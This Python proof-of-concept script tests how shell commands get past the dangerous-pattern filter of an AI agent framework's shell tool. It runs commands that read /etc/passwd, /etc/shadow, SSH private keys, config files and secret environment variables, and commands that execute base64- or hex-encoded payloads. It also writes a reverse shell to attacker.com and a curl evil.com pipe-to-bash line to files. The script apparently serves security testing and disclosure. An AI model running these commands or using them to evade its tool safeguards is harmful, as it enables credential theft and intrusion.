#!/usr/bin/env python3
"""
POC: Shell Command Injection Bypass Tests

This script demonstrates bypasses of the dangerous pattern regex in
nanobot/agent/tools/shell.py (lines 12-19).

Current pattern blocks:
- rm -rf /
- :(){ :|:& };: (fork bomb)
- mkfs
- dd .* of=/dev/
- > /dev/sd

This POC shows commands that bypass these patterns but still pose security risks.
"""

import asyncio
import sys
import os

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from nanobot.agent.tools.shell import ExecTool


class ShellInjectionPOC:
    """Demonstrates shell command injection vulnerabilities."""
    
    def __init__(self):
        self.tool = ExecTool()
        self.results = []
        
    async def test_command(self, name: str, command: str, expected_risk: str) -> dict:
        """Test a single command and record results."""
        result = {
            "name": name,
            "command": command,
            "expected_risk": expected_risk,
            "blocked": False,
            "output": None,
            "error": None
        }
        
        try:
            output = await self.tool.execute(command=command)
            result["output"] = output[:500] if output else None
            result["blocked"] = False
        except Exception as e:
            error_msg = str(e)
            if "blocked" in error_msg.lower() or "dangerous" in error_msg.lower():
                result["blocked"] = True
            result["error"] = error_msg
            
        self.results.append(result)
        return result
    
    async def run_all_tests(self):
        """Run all shell injection bypass tests."""
        print("=" * 60)
        print("SHELL COMMAND INJECTION POC")
        print("=" * 60)
        print()
        
        # Test 1: Command substitution bypass
        print("[TEST 1] Command Substitution - Reading /etc/passwd")
        r = await self.test_command(
            "command_substitution",
            "echo $(cat /etc/passwd)",
            "Read sensitive system file via command substitution"
        )
        self._print_result(r)
        
        # Test 2: Backtick command substitution
        print("[TEST 2] Backtick Substitution - Reading /etc/shadow (may fail due to perms)")
        r = await self.test_command(
            "backtick_substitution",
            "echo `cat /etc/shadow 2>/dev/null || echo 'no perms but executed'`",
            "Read shadow file via backticks"
        )
        self._print_result(r)
        
        # Test 3: Base64 encoded command
        print("[TEST 3] Base64 Encoded Command")
        # echo "cat /etc/passwd" | base64 = Y2F0IC9ldGMvcGFzc3dkCg==
        r = await self.test_command(
            "base64_encoded",
            "echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash",
            "Execute arbitrary command via base64 encoding"
        )
        self._print_result(r)
        
        # Test 4: Hex encoded command
        print("[TEST 4] Hex Encoded Command")
        # "id" in hex
        r = await self.test_command(
            "hex_encoded",
            "echo -e '\\x69\\x64' | bash",
            "Execute command via hex encoding"
        )
        self._print_result(r)
        
        # Test 5: Environment variable exfiltration
        print("[TEST 5] Environment Variable Exfiltration")
        r = await self.test_command(
            "env_exfiltration",
            "env | grep -iE '(key|secret|password|token|api)' || echo 'checked env'",
            "Extract sensitive environment variables"
        )
        self._print_result(r)
        
        # Test 6: Network reconnaissance
        print("[TEST 6] Network Reconnaissance")
        r = await self.test_command(
            "network_recon",
            "cat /etc/hosts && ip addr 2>/dev/null || ifconfig 2>/dev/null || echo 'network checked'",
            "Gather network information"
        )
        self._print_result(r)
        
        # Test 7: Process listing (information disclosure)
        print("[TEST 7] Process Information Disclosure")
        r = await self.test_command(
            "process_list",
            "ps aux | head -20",
            "List running processes"
        )
        self._print_result(r)
        
        # Test 8: SSH key exfiltration attempt
        print("[TEST 8] SSH Key Exfiltration Attempt")
        r = await self.test_command(
            "ssh_keys",
            "cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'no ssh keys found'",
            "Attempt to read SSH private keys"
        )
        self._print_result(r)
        
        # Test 9: Alternative rm commands (bypassing rm -rf / pattern)
        print("[TEST 9] Alternative Deletion Commands")
        r = await self.test_command(
            "alt_delete",
            "find /tmp/poc_test_dir -delete 2>/dev/null; echo 'find -delete executed'",
            "Delete files using find instead of rm"
        )
        self._print_result(r)
        
        # Test 10: Reverse shell setup (command only, won't connect)
        print("[TEST 10] Reverse Shell Command Construction")
        r = await self.test_command(
            "reverse_shell_construct",
            "echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/poc_revshell.txt && cat /tmp/poc_revshell.txt",
            "Write reverse shell command to file"
        )
        self._print_result(r)
        
        # Test 11: Resource exhaustion (memory)
        print("[TEST 11] Memory Exhaustion Attempt (limited)")
        r = await self.test_command(
            "memory_exhaust",
            "head -c 1000000 /dev/zero | xxd | head -100",
            "Generate large output to consume memory"
        )
        self._print_result(r)
        
        # Test 12: CPU exhaustion (will timeout but demonstrates the risk)
        print("[TEST 12] CPU Exhaustion Attempt (should timeout)")
        r = await self.test_command(
            "cpu_exhaust",
            "timeout 2 yes > /dev/null || echo 'timeout worked'",
            "CPU-intensive operation"
        )
        self._print_result(r)
        
        # Test 13: Pipe to interpreter bypass
        print("[TEST 13] Curl to Interpreter Pattern")
        r = await self.test_command(
            "curl_pipe_bash",
            "echo 'curl http://evil.com/script.sh | bash' > /tmp/poc_curl_bash.txt && echo 'command written'",
            "Demonstrate curl|bash pattern is not blocked"
        )
        self._print_result(r)
        
        # Test 14: Python reverse shell
        print("[TEST 14] Python Code Execution")
        r = await self.test_command(
            "python_exec",
            "python3 -c 'import os; print(os.popen(\"id\").read())'",
            "Execute commands via Python"
        )
        self._print_result(r)
        
        # Test 15: Reading config files
        print("[TEST 15] Configuration File Access")
        r = await self.test_command(
            "config_access",
            "cat /app/poc/config/config.json 2>/dev/null || echo 'no config'",
            "Read application configuration with potential secrets"
        )
        self._print_result(r)
        
        self._print_summary()
        return self.results
    
    def _print_result(self, result: dict):
        """Print a single test result."""
        status = "ðŸ›¡ï¸ BLOCKED" if result["blocked"] else "âš ï¸ EXECUTED"
        print(f"  Status: {status}")
        print(f"  Risk: {result['expected_risk']}")
        if result["output"]:
            output_preview = result["output"][:200].replace('\n', '\\n')
            print(f"  Output: {output_preview}...")
        if result["error"]:
            print(f"  Error: {result['error'][:100]}")
        print()
    
    def _print_summary(self):
        """Print test summary."""
        print("=" * 60)
        print("SUMMARY")
        print("=" * 60)
        
        blocked = sum(1 for r in self.results if r["blocked"])
        executed = sum(1 for r in self.results if not r["blocked"])
        
        print(f"Total tests: {len(self.results)}")
        print(f"Blocked: {blocked}")
        print(f"Executed (potential vulnerabilities): {executed}")
        print()
        
        if executed > 0:
            print("âš ï¸ VULNERABLE COMMANDS:")
            for r in self.results:
                if not r["blocked"]:
                    print(f"  - {r['name']}: {r['command'][:50]}...")
        
        return {
            "total": len(self.results),
            "blocked": blocked,
            "executed": executed,
            "vulnerability_confirmed": executed > 0
        }


async def main():
    poc = ShellInjectionPOC()
    results = await poc.run_all_tests()
    
    # Write results to file
    import json
    results_path = "/results/shell_injection_results.json" if os.path.isdir("/results") else "shell_injection_results.json"
    with open(results_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\nResults written to: {results_path}")


if __name__ == "__main__":
    asyncio.run(main())
